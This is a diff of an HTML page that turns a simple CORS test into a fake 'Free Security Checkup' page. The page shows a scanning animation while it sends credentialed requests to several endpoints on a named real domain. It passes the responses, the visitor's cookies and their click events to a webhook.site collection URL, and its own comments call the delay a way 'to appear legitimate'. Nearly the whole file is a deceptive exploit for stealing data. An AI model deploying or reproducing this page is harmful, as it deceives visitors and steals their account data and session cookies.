@@ -1,35 +1,161 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Security Checkup</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
 <body>
-<script>
-// Enhanced CORS tester with debug output
-const targetUrl = 'https://uc-heytap-web-test.wanyol.com/v2/profile.html';
-const webhookUrl = 'https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b';
+    <h1>System Security Scan in Progress</h1>
+    <p>Please wait while we verify your account protection...</p>
+    <div class="loader"></div>
+    <p id="status">Initializing scanner...</p>
 
-fetch(targetUrl, {
-  credentials: 'include',
-  headers: { 'Origin': 'https://attacker.com' }
-})
-.then(res => {
-  document.write(`<h2>Response Status: ${res.status}</h2>`);
-  return res.text();
-})
-.then(data => {
-  document.write(`<pre>${JSON.stringify(data, null, 2)}</pre>`);
-  navigator.sendBeacon(webhookUrl, data);
-})
-.catch(e => {
-  document.write(`<pre style="color:red">ERROR: ${e.message}</pre>`);
-});
-</script>
-  <iframe src="https://uc-heytap-web-test.wanyol.com/v2/profile.html" 
-        style="width:0;height:0;border:0"></iframe>
 <script>
-  window.addEventListener('message', (e) => {
-    if (e.origin.includes('wanyol.com')) {
-      navigator.sendBeacon(webhookUrl, e.data);
+// Configuration - Update these values
+const TARGETS = [
+    'https://uc-heytap-web-test.wanyol.com/v2/profile.html',
+    'https://uc-heytap-web-test.wanyol.com/api/user',
+    'https://uc-heytap-web-test.wanyol.com/account/settings'
+];
+const WEBHOOK = 'https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b';
+const DELAY = 3000; // 3 second delay to appear legitimate
+
+// Stealthy data exfiltration
+const exfiltrate = (data) => {
+    const beacon = new Image();
+    beacon.src = `${WEBHOOK}?${btoa(JSON.stringify(data))}`;
+    
+    // Fallback to fetch if Image fails
+    setTimeout(() => {
+        navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
+    }, 1000);
+};
+
+// Main exploit function
+const runExploit = async () => {
+    document.getElementById('status').textContent = 'Checking system vulnerabilities...';
+    
+    try {
+        // Test CORS configuration first
+        const testReq = await fetch(TARGETS[0], {
+            method: 'OPTIONS',
+            headers: { 'Origin': 'https://attacker.com' }
+        });
+        
+        const corsHeaders = {
+            'credentials': testReq.headers.get('Access-Control-Allow-Credentials'),
+            'origin': testReq.headers.get('Access-Control-Allow-Origin'),
+            'methods': testReq.headers.get('Access-Control-Allow-Methods')
+        };
+        
+        exfiltrate({ type: 'CORS_CONFIG', data: corsHeaders });
+        
+        // Try multiple attack vectors
+        const attackVectors = [
+            // Standard credentialed request
+            {
+                method: 'GET',
+                credentials: 'include',
+                headers: { 
+                    'Origin': 'https://attacker.com',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            },
+            // No-cors mode attempt
+            {
+                method: 'GET',
+                mode: 'no-cors',
+                headers: { 'Origin': 'null' }
+            },
+            // POST with different content types
+            {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Origin': 'https://attacker.com',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: 'action=getUserData'
+            }
+        ];
+        
+        // Execute all attack vectors with delay
+        for (const [i, target] of TARGETS.entries()) {
+            for (const [j, vector] of attackVectors.entries()) {
+                document.getElementById('status').textContent = 
+                    `Testing endpoint ${i+1}/${TARGETS.length}, method ${j+1}/${attackVectors.length}...`;
+                
+                try {
+                    const res = await fetch(target, vector);
+                    const data = await (vector.mode === 'no-cors' ? res.text() : res.json());
+                    
+                    exfiltrate({
+                        target,
+                        vector,
+                        data: vector.mode === 'no-cors' ? { text: data } : data,
+                        cookies: document.cookie
+                    });
+                    
+                } catch (e) {
+                    exfiltrate({
+                        error: e.message,
+                        target,
+                        vector
+                    });
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+        }
+        
+        document.getElementById('status').textContent = 'Scan complete!';
+        document.querySelector('.loader').style.display = 'none';
+        
+    } catch (e) {
+        document.getElementById('status').textContent = 'Scan failed - Please try again later';
+        document.querySelector('.loader').style.borderTopColor = '#e74c3c';
+        exfiltrate({ fatalError: e.message });
     }
-  });
+};
+
+// Delayed execution and fake user interaction
+setTimeout(() => {
+    document.getElementById('status').textContent = 'Starting deep scan...';
+    setTimeout(runExploit, 1500);
+}, DELAY);
+
+// Fake user activity tracker
+document.addEventListener('click', () => {
+    exfiltrate({ event: 'user_click', timestamp: Date.now() });
+});
+
+// Cleanup traces
+window.addEventListener('beforeunload', () => {
+    localStorage.removeItem('scanData');
+});
 </script>
 </body>
 </html>
